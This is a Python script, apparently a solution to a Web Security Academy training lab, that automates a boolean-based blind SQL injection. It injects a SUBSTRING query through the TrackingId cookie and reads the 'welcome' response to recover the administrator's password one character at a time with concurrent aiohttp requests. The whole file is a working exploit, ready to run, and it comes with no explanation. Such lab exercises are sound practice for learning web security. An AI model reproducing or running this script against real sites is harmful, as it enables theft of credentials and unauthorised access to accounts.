import aiohttp
import asyncio

async def send_req(session, user_session, char, position):
    url = "https://0a01003f036680a3910d5a7b00e80023.web-security-academy.net/filter"
    params = {"category": "Gifts"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://0a01003f036680a3910d5a7b00e80023.web-security-academy.net/",
        "Upgrade-Insecure-Requests": "1",
        "Cookie": f"TrackingId=ZzzPCSZEwOvDr9vB'+AND+(SELECT SUBSTRING(password,{position},1)+FROM+users+WHERE+username='administrator')='{char}'+--;session={user_session};"
    }

    async with session.get(url, headers=headers, params=params) as resp:
        text = await resp.text()
        if "welcome" in text.lower():
            return (position, char)
    return None


async def main():
    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
    user_session = "Your SESSION"
    password = {}

    async with aiohttp.ClientSession() as session:
        for position in range(1, 30):
            tasks = [send_req(session, user_session, char, position) for char in characters]
            results = await asyncio.gather(*tasks)

            for result in results:
                if result:
                    pos, char = result
                    password[pos] = char
                    print(f"[+] Found char at pos {pos}: {char}")

    cracked = "".join(password.get(i, "") for i in range(1, 30))
    print(f"\n[FINAL PASSWORD PART]: {cracked}")


if __name__ == "__main__":
    asyncio.run(main())
